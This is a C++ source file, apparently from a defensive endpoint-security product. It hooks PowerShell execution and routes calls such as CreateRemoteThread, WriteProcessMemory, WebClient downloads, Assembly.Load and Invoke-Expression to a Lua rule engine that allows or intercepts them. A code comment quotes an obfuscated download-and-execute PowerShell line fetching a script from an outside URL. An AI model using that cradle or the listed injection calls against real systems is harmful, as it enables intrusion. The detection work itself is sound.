#include "pch.h"
#include <algorithm>
#include <atlstr.h>
#include <strsafe.h>
#include "shellapi.h"
#include "PowershellCmdHandler.h"
#include "utils.h"
#include "include/3rdparty/crc32/CRC32.h"

using std::placeholders::_1;
using std::placeholders::_2;
using std::placeholders::_3;

#define POWERSHELL_ACTION_ALLOW 0
#define POWERSHELL_ACTION_INTERCEPT 1


PowershellCmdHandler::PowershellCmdHandler()
{
    m_pLuaEngine = nullptr;
}


PowershellCmdHandler::~PowershellCmdHandler()
{
}

BOOL PowershellCmdHandler::Initialize(LuaenginePtr pLuaEngine)
{
    InitNormalStrategys();
    InitNativeStrategys();
    InitCommandStrategys();
    m_pLuaEngine = pLuaEngine;
    return TRUE;
}

BOOL PowershellCmdHandler::Uninitialize()
{
    m_CmdSet.clear();
    m_mapNormalStrategys.clear();
    m_mapNativeStrategys.clear();

    {
        std::lock_guard<std::mutex> MutexGuard(m_ActionResultMutex);
        m_CmdActionResult.clear();
    }
    return TRUE;
}

void PowershellCmdHandler::InitNativeStrategys()
{
    auto InitNative = [this](
        int id,
        int nArgCount,
        LPCWSTR szFunctionName,
        PUCHAR FunctionPtr,
        ArgumentTypeVector & vecTypes,
        NativeCallBackFunc callback = nullptr)
    {
        NativeStrategyPtr Strategy = std::make_shared<NativeStrategy>();
        Strategy->id = id;
        Strategy->strFunctionName = szFunctionName;
        Strategy->FunctionPtr = FunctionPtr;
        Strategy->vecTypes.swap(vecTypes);
        Strategy->callback = callback;
        auto Founded = m_mapNativeStrategys.find(nArgCount);
        if (Founded != m_mapNativeStrategys.end())
        {
            Founded->second.push_back(Strategy);
        }
        else
        {
            std::vector<NativeStrategyPtr> vecStrategy;
            vecStrategy.push_back(Strategy);
            m_mapNativeStrategys.insert(std::make_pair(nArgCount, vecStrategy));
        }
    };

    NativeCallBackFunc DefaultCallbackFunc = std::bind(&PowershellCmdHandler::CommonCallback, this, _1, _2, _3);

    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_INT,ArgType::TYPE_INT,
            ArgType::TYPE_POINT,ArgType::TYPE_POINT,ArgType::TYPE_INT,ArgType::TYPE_POINT };
        InitNative(2001, 6, L"CreateThread", (PUCHAR)CreateThread, vecTypes, DefaultCallbackFunc);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT,ArgType::TYPE_INT,ArgType::TYPE_INT,ArgType::TYPE_INT };
        InitNative(2002, 4, L"VirtualAlloc", (PUCHAR)VirtualAlloc, vecTypes, DefaultCallbackFunc);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT,ArgType::TYPE_POINT,ArgType::TYPE_INT,ArgType::TYPE_INT,ArgType::TYPE_INT };
        InitNative(2003, 5, L"VirtualAllocEx", (PUCHAR)VirtualAllocEx, vecTypes, DefaultCallbackFunc);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT, ArgType::TYPE_STRING };
        InitNative(2004, 2, L"GetProcAddress", (PUCHAR)GetProcAddress, vecTypes, FALSE);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_STRING };
        InitNative(2005, 1, L"GetModuleHandleA", (PUCHAR)GetModuleHandleA, vecTypes, FALSE);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_STRING };
        InitNative(2006, 1, L"LoadLibraryA", (PUCHAR)LoadLibraryA, vecTypes, FALSE);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT, ArgType::TYPE_INT, ArgType::TYPE_INT, ArgType::TYPE_POINT };
        InitNative(2007, 4, L"VirtualProtect", (PUCHAR)VirtualProtect, vecTypes);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT, ArgType::TYPE_INT, ArgType::TYPE_INT };
        InitNative(2008, 3, L"OpenProcess", (PUCHAR)OpenProcess, vecTypes);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT, ArgType::TYPE_POINT,
            ArgType::TYPE_BINARY, ArgType::TYPE_INT, ArgType::TYPE_POINT };
        InitNative(2009, 5, L"WriteProcessMemory", (PUCHAR)WriteProcessMemory, vecTypes, DefaultCallbackFunc);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT, ArgType::TYPE_POINT,
            ArgType::TYPE_POINT, ArgType::TYPE_INT, ArgType::TYPE_POINT };
        InitNative(2010, 5, L"ReadProcessMemory", (PUCHAR)ReadProcessMemory, vecTypes);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT, ArgType::TYPE_POINT,
            ArgType::TYPE_INT, ArgType::TYPE_POINT, ArgType::TYPE_POINT, ArgType::TYPE_INT, ArgType::TYPE_POINT };
        InitNative(2011, 7, L"CreateRemoteThread", (PUCHAR)CreateRemoteThread, vecTypes, DefaultCallbackFunc);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT, ArgType::TYPE_STRING,
            ArgType::TYPE_STRING, ArgType::TYPE_STRING, ArgType::TYPE_STRING, ArgType::TYPE_INT };
        InitNative(2012, 6, L"ShellExecute", (PUCHAR)ShellExecuteW, vecTypes);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_STRING, ArgType::TYPE_INT };
        InitNative(2013, 2, L"WinExec", (PUCHAR)WinExec, vecTypes);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_STRING, ArgType::TYPE_STRING, ArgType::TYPE_INT };
        InitNative(2014, 3, L"OpenSCManagerA", (PUCHAR)OpenSCManagerA, vecTypes);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT, ArgType::TYPE_STRING, ArgType::TYPE_INT };
        InitNative(2015, 3, L"OpenServiceA", (PUCHAR)OpenServiceA, vecTypes);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT, ArgType::TYPE_STRING, ArgType::TYPE_STRING,
            ArgType::TYPE_INT, ArgType::TYPE_INT, ArgType::TYPE_INT, ArgType::TYPE_INT, ArgType::TYPE_STRING, 
            ArgType::TYPE_STRING, ArgType::TYPE_POINT, ArgType::TYPE_STRING, ArgType::TYPE_STRING, ArgType::TYPE_STRING };
        InitNative(2016, 13, L"CreateServiceA", (PUCHAR)CreateServiceA, vecTypes);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT, ArgType::TYPE_INT, ArgType::TYPE_POINT };
        InitNative(2017, 3, L"StartServiceA", (PUCHAR)StartServiceA, vecTypes);
    }
    {
        ArgumentTypeVector vecTypes = { ArgType::TYPE_POINT };
        InitNative(2017, 1, L"DeleteService", (PUCHAR)DeleteService, vecTypes);
    }
}

void PowershellCmdHandler::InitNormalStrategys()
{
    auto InitNormal = [this](
        int id,
        int nArgCount,
        LPCWSTR szFunctionName,
        std::vector<std::wstring> & vecExtra,
        ArgumentTypeVector & vecTypes,
        NormalCallBackFunc callback = nullptr)
    {
        NormalStrategyPtr Strategy = std::make_shared<NormalStrategy>();
        Strategy->id = id;
        Strategy->strFunctionName = szFunctionName;
        Strategy->vecExtraInfo = vecExtra;
        Strategy->vecTypes.swap(vecTypes);
        Strategy->callback = callback;
        auto Founded = m_mapNormalStrategys.find(nArgCount);
        if (Founded != m_mapNormalStrategys.end())
        {
            Founded->second.push_back(Strategy);
        }
        else
        {
            std::vector<NormalStrategyPtr> vecStrategy;
            vecStrategy.push_back(Strategy);
            m_mapNormalStrategys.insert(std::make_pair(nArgCount, vecStrategy));
        }
        std::wstring strFunctionName = Strategy->strFunctionName;
        std::transform(strFunctionName.begin(), strFunctionName.end(), strFunctionName.begin(), tolower);
        m_CmdSet.emplace(strFunctionName);
    };

    NormalCallBackFunc DefaultCallbackFunc = std::bind(&PowershellCmdHandler::CommonCallback, this, _1, _2, _3);
    NormalCallBackFunc LoadAssemblyCallBack = std::bind(&PowershellCmdHandler::LoadAssemblyCallback, this, _1, _2, _3);
    NormalCallBackFunc OpenReadCallBack = std::bind(&PowershellCmdHandler::OpenReadCallback, this, _1, _2, _3);

    {
        std::vector<std::wstring> vecExtra = { L"System.Net.Webclient", L"Net.Webclient" };
        ArgumentTypeVector vecTypes1 = { ArgType::TYPE_STRING };
        InitNormal(1001, 1, L"DownloadString", vecExtra, vecTypes1, DefaultCallbackFunc);

        ArgumentTypeVector vecTypes2 = { ArgType::TYPE_STRING, ArgType::TYPE_STRING };
        InitNormal(1002, 2, L"DownloadFile", vecExtra, vecTypes2, DefaultCallbackFunc);

        ArgumentTypeVector vecTypes3 = { ArgType::TYPE_STRING };
        InitNormal(1003, 1, L"DownloadData", vecExtra, vecTypes3, DefaultCallbackFunc);

        ArgumentTypeVector vecTypes4 = { ArgType::TYPE_STRING, ArgType::TYPE_BINARY };
        InitNormal(1004, 2, L"UploadData", vecExtra, vecTypes4, DefaultCallbackFunc);

        ArgumentTypeVector vecTypes5 = { ArgType::TYPE_STRING };
        InitNormal(1005, 1, L"UploadString", vecExtra, vecTypes5, DefaultCallbackFunc);

        ArgumentTypeVector vecTypes6 = { ArgType::TYPE_STRING, ArgType::TYPE_BINARY };
        InitNormal(1006, 2, L"UploadFile", vecExtra, vecTypes6, DefaultCallbackFunc);
    }

    {
        std::vector<std::wstring> vecExtra = { L"Shell.Application" };
        ArgumentTypeVector vecTypes = { ArgType::TYPE_STRING };
        InitNormal(1007, 1, L"open", vecExtra, vecTypes);
    }

    {
        std::vector<std::wstring> vecExtra = { L"WScript.Shell" };
        ArgumentTypeVector vecTypes = { ArgType::TYPE_STRING };
        InitNormal(1008, 1, L"Exec", vecExtra, vecTypes);

        ArgumentTypeVector vecTypes1 = { ArgType::TYPE_STRING };
        InitNormal(1009, 1, L"RegDelete", vecExtra, vecTypes1);

        ArgumentTypeVector vecTypes2 = { ArgType::TYPE_STRING, ArgType::TYPE_STRING, ArgType::TYPE_STRING };
        InitNormal(1010, 3, L"RegWriteSZ", vecExtra, vecTypes2);

        ArgumentTypeVector vecTypes3 = { ArgType::TYPE_STRING, ArgType::TYPE_INT, ArgType::TYPE_STRING };
        InitNormal(1010, 3, L"RegWriteDword", vecExtra, vecTypes3);

        ArgumentTypeVector vecTypes4 = { ArgType::TYPE_STRING, ArgType::TYPE_BINARY, ArgType::TYPE_STRING };
        InitNormal(1010, 3, L"RegWriteBinary", vecExtra, vecTypes4);
    }

    {
        std::vector<std::wstring> vecExtra = {};
        ArgumentTypeVector vecTypes1 = { ArgType::TYPE_POINT,ArgType::TYPE_STRING,ArgType::TYPE_POINT,ArgType::TYPE_STRING };
        InitNormal(1011, 4, L"CallByname", vecExtra, vecTypes1, DefaultCallbackFunc);

        ArgumentTypeVector vecTypes2 = { ArgType::TYPE_BINARY_PE };
        InitNormal(1012, 1, L"Load", vecExtra, vecTypes2, LoadAssemblyCallBack);

        ArgumentTypeVector vecTypes3 = { ArgType::TYPE_STRING };
        InitNormal(1013, 1, L"OpenRead", vecExtra, vecTypes3, OpenReadCallBack);
    }

    {
        std::vector<std::wstring> vecExtra = {};
        ArgumentTypeVector vecTypes1 = { ArgType::TYPE_POINT,ArgType::TYPE_INT,ArgType::TYPE_INT,ArgType::TYPE_INT };
        InitNormal(2002, 4, L"VirtualAlloc", vecExtra, vecTypes1, DefaultCallbackFunc);

        ArgumentTypeVector vecTypes2 = { ArgType::TYPE_POINT,ArgType::TYPE_POINT,ArgType::TYPE_INT,ArgType::TYPE_INT,ArgType::TYPE_INT };
        InitNormal(2003, 5, L"VirtualAllocEx", vecExtra, vecTypes2, DefaultCallbackFunc);

        ArgumentTypeVector vecTypes3 = { ArgType::TYPE_POINT, ArgType::TYPE_INT, ArgType::TYPE_INT };
        InitNormal(2008, 3, L"OpenProcess", vecExtra, vecTypes3);

        ArgumentTypeVector vecTypes4 = { ArgType::TYPE_POINT, ArgType::TYPE_POINT,
            ArgType::TYPE_BINARY, ArgType::TYPE_INT, ArgType::TYPE_POINT };
        InitNormal(2009, 5, L"WriteProcessMemory", vecExtra, vecTypes4, DefaultCallbackFunc);

        ArgumentTypeVector vecTypes5 = { ArgType::TYPE_POINT, ArgType::TYPE_POINT,
            ArgType::TYPE_INT, ArgType::TYPE_POINT, ArgType::TYPE_POINT, ArgType::TYPE_INT, ArgType::TYPE_POINT };
        InitNormal(2011, 7, L"CreateRemoteThread", vecExtra, vecTypes5, DefaultCallbackFunc);

        ArgumentTypeVector vecTypes6 = { ArgType::TYPE_INT,ArgType::TYPE_INT,
            ArgType::TYPE_POINT,ArgType::TYPE_POINT,ArgType::TYPE_INT,ArgType::TYPE_POINT };
        InitNormal(2001, 6, L"CreateThread", vecExtra, vecTypes6, DefaultCallbackFunc);

        ArgumentTypeVector vecTypes7 = { ArgType::TYPE_POINT, ArgType::TYPE_STRING,
            ArgType::TYPE_STRING, ArgType::TYPE_STRING, ArgType::TYPE_STRING, ArgType::TYPE_INT };
        InitNormal(2012, 6, L"ShellExecute", vecExtra, vecTypes7);

        ArgumentTypeVector vecTypes8 = { ArgType::TYPE_STRING, ArgType::TYPE_INT };
        InitNormal(2013, 2, L"WinExec", vecExtra, vecTypes8);
    }
}

void PowershellCmdHandler::InitCommandStrategys()
{
    auto InitCommand = [this](
        int id,
        LPCWSTR szCommandName,
        BOOL bNeedReport = TRUE,
        CommandCallBackFunc callback = nullptr)
    {
        CommandStrategyPtr Strategy = std::make_shared<CommandStrategy>();
        Strategy->id = id;
        Strategy->strCommandName = szCommandName;
        Strategy->callback = callback;
        m_vecCommandStrategys.push_back(Strategy);
        std::wstring strCommandName = Strategy->strCommandName;
        std::transform(strCommandName.begin(), strCommandName.end(), strCommandName.begin(), tolower);
        m_CommandSet.emplace(strCommandName);
    };

    InitCommand(3001, L"Invoke-Expression", TRUE, std::bind(&PowershellCmdHandler::CommandCallback, this, _1, _2, _3));
    InitCommand(3002, L"Invoke-WebRequest", TRUE, std::bind(&PowershellCmdHandler::CommandCallback, this, _1, _2, _3));
}

BOOL PowershellCmdHandler::IsCmdNeedHandle(std::wstring& strFunctionName)
{
    std::wstring strFunctionNameLowercase = strFunctionName;
    std::transform(strFunctionNameLowercase.begin(), strFunctionNameLowercase.end(), strFunctionNameLowercase.begin(), tolower);
    if (m_CmdSet.count(strFunctionNameLowercase) != 0)
        return TRUE;

    return FALSE;
}

BOOL PowershellCmdHandler::IsCommandNeedHanle(std::wstring& strCommandName)
{
    std::wstring strCommandNameLowercase = strCommandName;
    std::transform(strCommandNameLowercase.begin(), strCommandNameLowercase.end(), strCommandNameLowercase.begin(), tolower);
    if (m_CommandSet.count(strCommandNameLowercase) != 0)
        return TRUE;

    return FALSE;
}

int PowershellCmdHandler::NativeMethodHandler(HelpPtr& helper, int nArgCount, void* DynamicinsOrNativeMethod, void* InterpretedFrameOrarguments)
{
    BOOL bNeedTryPSMethod = TRUE;
    auto Founded = m_mapNativeStrategys.find(nArgCount);
    if (Founded != m_mapNativeStrategys.end())
    {
        PUCHAR FunctionPtr = nullptr;
        if (helper->GetNativeMethodPtr(DynamicinsOrNativeMethod, InterpretedFrameOrarguments, FunctionPtr) && FunctionPtr != nullptr)
        {
            for (auto& strategy : Founded->second)
            {
                if (strategy->FunctionPtr == FunctionPtr)
                {
                    int nFinalAction = POWERSHELL_ACTION_ALLOW;
                    bNeedTryPSMethod = FALSE;
                    ArgumentVector vecArgs;
                    helper->GetFunctionArguments(DynamicinsOrNativeMethod, InterpretedFrameOrarguments, vecArgs, strategy->vecTypes);

                    if (strategy->callback != nullptr)
                    {
                        nFinalAction = strategy->callback(strategy->id, strategy->strFunctionName, vecArgs);
                    }

                    return nFinalAction;
                }
            }
        }
    }

    //Invoke-Expression (New-Object Net.WebClient).("DownloadString").Invoke('h'+'ttp://7ell.me/power')
    //通过Invoke Psmethod调用，普通方式无法拦截到
    if (bNeedTryPSMethod)
    {
        std::wstring strPsMethodName;
        if (helper->GetPSMethodName(DynamicinsOrNativeMethod, InterpretedFrameOrarguments, strPsMethodName))
        {
            if (IsCmdNeedHandle(strPsMethodName))
            {
                void* TrueArgs = nullptr;
                if (helper->CovertArgument(InterpretedFrameOrarguments, nArgCount, &TrueArgs))
                {
                    return NormalMethodHandlerForInvoke(helper, nArgCount, strPsMethodName, DynamicinsOrNativeMethod, TrueArgs);
                }
            }
        }
    }
    return POWERSHELL_ACTION_ALLOW;
}

//为了安全, 当NavtiveMethodHandler调用NormalMethodHanler用这个.
//因为在这种情况下参数 "void* DynamicinsOrNativeMethod" 可能无效
int PowershellCmdHandler::NormalMethodHandlerForInvoke(HelpPtr& helper, int nArgCount, std::wstring& strFunction, void* PSMethod, void* arguments)
{
    auto Founded = m_mapNormalStrategys.find(nArgCount);
    if (Founded == m_mapNormalStrategys.end())
    {
        return 0;
    }

    for (auto& strategy : Founded->second)
    {
        if (_wcsicmp(strategy->strFunctionName.c_str(), strFunction.c_str()) == 0)
        {
            int nFinalAction = POWERSHELL_ACTION_ALLOW;
            std::wstring strExtraInfo;
            ArgumentVector vecArgs;
            helper->GetFunctionArguments(PSMethod, arguments, vecArgs, strategy->vecTypes);

            if (strategy->callback != nullptr)
            {
                nFinalAction = strategy->callback(strategy->id, strategy->strFunctionName, vecArgs);
            }

            return nFinalAction;
        }
    }

    return POWERSHELL_ACTION_ALLOW;
}

int PowershellCmdHandler::NormalMethodHandler(HelpPtr& helper, int nArgCount, std::wstring& strFunction, void* DynamicinsOrNativeMethod, void* InterpretedFrameOrarguments)
{
    auto Founded = m_mapNormalStrategys.find(nArgCount);
    if (Founded == m_mapNormalStrategys.end())
    {
        return 0;
    }

    for (auto& strategy : Founded->second)
    {
        if (_wcsicmp(strategy->strFunctionName.c_str(), strFunction.c_str()) == 0)
        {
            ArgumentVector vecArgs;
            helper->GetFunctionArguments(DynamicinsOrNativeMethod, InterpretedFrameOrarguments, vecArgs, strategy->vecTypes);

            int nFinalAction = POWERSHELL_ACTION_ALLOW;
            if (strategy->callback != nullptr)
            {
                nFinalAction =  strategy->callback(strategy->id, strategy->strFunctionName, vecArgs);
            }

            return nFinalAction;
        }
    }

    return POWERSHELL_ACTION_ALLOW;
}

int PowershellCmdHandler::CommandHandler(HelpPtr& helper, std::wstring& strCommandName, void* CmdProcessor)
{
    for (auto& strategy : m_vecCommandStrategys)
    {
        if (strategy->strCommandName == strCommandName)
        {
            CommandArgumentVector vecArgs;
            CommandParameterVector vecParams;
            if (!helper->GetCommandArguments(CmdProcessor, vecArgs, vecParams))
                return 0;

            std::wstring strArg;
            for (auto& arg : vecArgs)
            {
                strArg += arg;
                strArg += L" ";
            }

            int nActionResult = POWERSHELL_ACTION_ALLOW;
            if (GetActionResult(strArg, nActionResult))
            {
                return nActionResult;
            }

            switch (strategy->id)
            {
            case 3001:
            {
                if(vecArgs.empty())
                    break;

                if (strategy->callback != nullptr)
                {
                    nActionResult = strategy->callback(strategy->id, strategy->strCommandName, strArg);
                    SetActionResult(strArg, nActionResult);
                }

                return nActionResult;
            }
            break;

            case 3002:
            {
                if (vecArgs.empty())
                    break;

                if (strategy->callback != nullptr)
                {
                    nActionResult = strategy->callback(strategy->id, strategy->strCommandName, strArg);
                    SetActionResult(strArg, nActionResult);
                }

                return nActionResult;
            }
            break;
            }

            SetActionResult(strArg, nActionResult);
        }
    }

    return POWERSHELL_ACTION_ALLOW;
}

int PowershellCmdHandler::CommonCallback(
    int nId, 
    std::wstring& strFunctionName, 
    ArgumentVector& vecArgs)
{
    if (m_pLuaEngine == nullptr)
        return 0;

    std::vector<std::wstring> vecStrArgs;
    for (auto& arg : vecArgs)
    {
        std::wstring strArg = std::visit(ArgVisitor(), arg);
        vecStrArgs.push_back(strArg);
    }

    std::string strJsonString;
    Utils::FormatCheckerJsonString(strFunctionName, vecStrArgs, strJsonString);
    int nActionResult =  m_pLuaEngine->ExecuteFunc(POWERSHELL_CHECK_FUNCTION, strJsonString.c_str());

    return nActionResult;
}

int PowershellCmdHandler::CommandCallback(
    int nId, 
    std::wstring& strFunctionName, 
    std::wstring& strArg)
{
    if (m_pLuaEngine == nullptr)
        return 0;

    std::vector<std::wstring> vecStrArgs;
    vecStrArgs.push_back(strArg);

    std::string strJsonString;
    Utils::FormatCheckerJsonString(strFunctionName, vecStrArgs, strJsonString);
    int nActionResult = m_pLuaEngine->ExecuteFunc(POWERSHELL_CHECK_FUNCTION, strJsonString.c_str());

    return nActionResult;
}

/*
* 针对反射加载做了特殊处理，取参数时只有bytes数组为PE的时候才会将整个数组base64加密后传过来
*/
int PowershellCmdHandler::LoadAssemblyCallback(
    int nId, 
    std::wstring& strFunctionName, 
    ArgumentVector& vecArgs)
{
    if (vecArgs.size() != 1)
        return 0;

    std::wstring strArg = std::visit(ArgVisitor(), vecArgs.at(0));

    if (strArg.empty())
        return 0;

    if (m_pLuaEngine == nullptr)
        return 0;

    std::vector<std::wstring> vecStrArgs;
    vecStrArgs.push_back(strArg);

    std::string strJsonString;
    Utils::FormatCheckerJsonString(strFunctionName, vecStrArgs, strJsonString, FALSE);
    int nActionResult = m_pLuaEngine->ExecuteFunc(POWERSHELL_CHECK_FUNCTION, strJsonString.c_str());

    return nActionResult;
}

int PowershellCmdHandler::OpenReadCallback(
    int nId, 
    std::wstring& strFunctionName, 
    ArgumentVector& vecArgs)
{
    if (m_pLuaEngine == nullptr)
        return 0;

    if (vecArgs.size() != 1)
        return 0;

    std::vector<std::wstring> vecStrArgs;
    for (auto& arg : vecArgs)
    {
        std::wstring strArg = std::visit(ArgVisitor(), arg);
        vecStrArgs.push_back(strArg);
    }

    if (!Utils::IsValidUrlPrefix(vecStrArgs.at(0)))
        return 0;

    std::string strJsonString;
    Utils::FormatCheckerJsonString(strFunctionName, vecStrArgs, strJsonString);
    int nActionResult = m_pLuaEngine->ExecuteFunc(POWERSHELL_CHECK_FUNCTION, strJsonString.c_str());

    return nActionResult;
}

BOOL PowershellCmdHandler::SetActionResult(std::wstring& strContex, int nActionResult)
{
    int nLength = static_cast<int>(strContex.length() > 200 ? 200 : strContex.length());

    unsigned int uCrc = CRC32(0, (void*)strContex.c_str(), nLength * sizeof(WCHAR));

    {
        std::lock_guard<std::mutex> MutexGuard(m_ActionResultMutex);
        m_CmdActionResult.insert(std::make_pair(uCrc, nActionResult));
    }

    return TRUE;
}

BOOL PowershellCmdHandler::GetActionResult(std::wstring& strContex, int& nActionResult)
{
    int nLength = static_cast<int>(strContex.length() > 200 ? 200 : strContex.length());

    unsigned int uCrc = CRC32(0, (void*)strContex.c_str(), nLength * sizeof(WCHAR));

    {
        std::lock_guard<std::mutex> MutexGuard(m_ActionResultMutex);
        auto iter = m_CmdActionResult.find(uCrc);
        if(iter != m_CmdActionResult.end())
        {
            nActionResult = iter->second;
            m_CmdActionResult.erase(iter);
            return TRUE;
        }
    }

    return FALSE;
}
